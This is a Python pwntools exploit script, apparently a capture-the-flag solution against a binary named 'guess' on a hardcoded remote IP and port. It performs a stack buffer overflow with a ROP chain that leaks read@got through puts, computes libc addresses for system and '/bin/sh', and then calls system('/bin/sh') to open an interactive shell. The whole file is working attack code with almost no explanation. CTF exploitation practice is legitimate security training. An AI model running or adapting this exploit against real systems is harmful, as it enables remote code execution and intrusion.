from pwn import *
from LibcSearcher import *


# p = process('/home/nop/Desktop/guess')
p = remote('149.129.103.121',10003)
elf = ELF('/home/nop/Desktop/guess')
lib = ELF('/home/nop/Desktop/libc.so.6')

puts_plt = elf.symbols['puts']
read_got = elf.got['read']
log.info("puts_plt = %#x, read_got = %#x"%(puts_plt,read_got))
pop_rdi = 0x4012ab
start = 0x401080

p.recvuntil('please input your name\n')
p.send('nop')   # whatever just input
p.recvuntil("Let's start a game,can you guess the key?\n")

payload = 'A'*40
payload += p64(pop_rdi)
payload += p64(read_got)    # transfer the read@got to function puts
payload += p64(puts_plt)    # call th function puts
payload += p64(start)   # set the return address,make process restart

p.send(payload)
p.recvuntil("fail!\n")
read_addr = u64(p.recv()[:6].ljust(8,'\x00'))
log.info("read_addr = %#x",read_addr)

# libc = LibcSearcher('read',read_addr)
# libc_base = read_addr - libc.dump('read')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')

system_addr = read_addr - (lib.symbols['read'] - lib.symbols['system'])
binsh_addr = read_addr - (lib.symbols['read']- next(lib.search("/bin/sh")))
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr,binsh_addr))

p.send('nop')   # whatever just input
p.recvuntil("Let's start a game,can you guess the key?\n")

payload1 = 'A'*40
payload1 += p64(pop_rdi)    # ransfer the binsh_addr to function puts 
payload1 += p64(binsh_addr)
payload1 += p64(system_addr)    # call system
payload1 += p64(start)  # put the return address,could put aything of course

p.send(payload1)
sleep(3)
p.interactive()
